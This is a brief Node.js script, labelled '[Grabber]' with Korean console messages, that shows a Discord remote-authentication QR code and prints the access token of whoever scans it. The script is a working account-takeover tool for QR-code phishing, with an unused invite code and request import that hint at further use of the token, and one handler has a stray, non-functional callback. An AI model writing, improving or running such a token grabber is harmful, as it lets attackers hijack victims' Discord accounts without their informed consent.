const invite = 'JvR3dcjK';

const request = require("request");
const chalk = require("chalk");
const qrcode = require('qrcode-terminal');
const { RemoteAuthClient } = require("discord-remote-auth");

const prefix = chalk.cyan('[Grabber]');

let client = new RemoteAuthClient();

client.on('pendingRemoteInit', fingerprint => {
    let url = `https://discord.com/ra/${fingerprint}`;
    qrcode.generate(url, { small: true }, qr => {
        console.log(qr);
        console.log(prefix, 'QR 코드를 스캔해주세요.');
    });
});

client.on('pendingFinish', user => {
    console.log(prefix, `안녕하세요, ${user.username}님.`);
});

client.on('finish', token => {
    console.log(prefix, `엑세스 토큰: ${token}`);
}, (err, res, body) => {
    if (err) return console.error(err);
    console.log(body);
});

client.connect();
